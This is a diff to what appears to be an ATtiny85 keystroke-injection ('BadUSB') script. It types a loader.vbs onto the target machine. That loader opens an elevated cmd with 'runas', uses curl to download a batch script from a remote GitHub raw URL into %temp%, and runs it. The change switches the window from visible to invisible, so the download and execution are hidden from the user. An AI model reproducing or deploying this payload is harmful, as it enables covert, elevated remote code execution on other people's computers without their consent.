@@ -11,13 +11,8 @@ PowerShell Set-WinUserLanguageList -LanguageList de-DE -force
 @rem full_script.bat url: https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat
 
 @rem .vbs script to run bat script (0: invisible, 1: visible)
-CreateObject("Shell.Application").ShellExecute "script.bat",,"","runas",1
-CreateObject("Shell.Application").ShellExecute "cmd","/k curl -m 10 --retry 20 -o output.bat SCRIPT_URL&full_script.bat","","runas",1
-
-CreateObject("Shell.Application").ShellExecute "cmd","/k cd %temp%&echo|set /p="curl -m 10 --retry 20 -o full_script.bat https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat and full_script.bat","","runas",1
-
-win-run cmd /k %temp%&copy con loader.vbs
-CreateObject("Shell.Application").ShellExecute "cmd","/k curl -m 10 --retry 20 -o %temp%\script.bat https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat&%temp%\script.bat","","runas",1
+cmd /k cd %temp%&copy con loader.vbs
+CreateObject("Shell.Application").ShellExecute "cmd","/k curl -m 10 --retry 20 -o %temp%\script.bat https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat&%temp%\script.bat","","runas",0
 Key: Enter
 Key: Ctrl+C
 loader.vbs
